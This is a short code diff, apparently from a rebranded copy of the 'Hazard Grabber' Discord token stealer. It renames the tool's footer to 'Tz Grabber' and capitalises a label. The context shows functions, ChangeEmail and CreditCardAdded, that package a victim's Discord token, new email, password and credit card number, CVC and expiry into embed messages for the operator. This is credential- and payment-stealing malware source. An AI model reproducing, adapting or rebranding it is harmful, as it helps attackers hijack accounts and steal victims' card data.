@@ -247,7 +247,7 @@ function ChangeEmail(newemail, password, token) {
                             "inline": true
                         },
                         {
-                            "name": "**Token**",
+                            "name": "**TOKEN**",
                             "value": `\`${token}\``,
                             "inline": false
                         }
@@ -257,7 +257,7 @@ function ChangeEmail(newemail, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "Tz Grabber ・ https://instagram.com/tzfofo"
                     }                
                 }
             ]
@@ -304,7 +304,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "Tz Grabber ・ https://instagram.com/tzfofo"
                     }
                 }
             ]
